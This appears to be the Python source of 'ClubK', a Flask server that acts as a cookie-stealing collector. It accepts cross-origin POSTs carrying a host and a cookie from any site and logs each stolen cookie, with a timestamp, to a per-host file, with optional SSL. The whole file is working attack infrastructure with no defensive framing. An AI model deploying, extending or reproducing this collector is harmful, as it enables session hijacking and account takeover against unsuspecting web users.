# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：ClubK.py
# Author   ：0xsdeo
# Date     ：2024/9/27 23:16
import os
import time
import json
import argparse
from flask import *
from flask_cors import CORS

from config import *


def save_data(data):
    get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    if os.path.isdir(f"{os.getcwd()}/cookies"):
        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\t' + data['cookie'] + '\n')
    else:
        os.mkdir(f"{os.getcwd()}/cookies")
        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\t' + data['cookie'] + '\n')


app = Flask(__name__)
CORS(app, resources=r'/*')


@app.route('/request', methods=['POST'])
def get_cookie():
    data = request.get_data().decode()
    data = json.loads(data)
    save_data(data)
    return "success"


@app.route('/')
def index():
    return render_template('index.html')


arg = argparse.ArgumentParser()
arg.add_argument('-ssl', action="store_true", help="配置ssl，可选项")
arg = arg.parse_args()

if arg.ssl:
    ssl = (pem, key)
    app.run("0.0.0.0", port=5000, ssl_context=ssl)

app.run("0.0.0.0", port=5000)
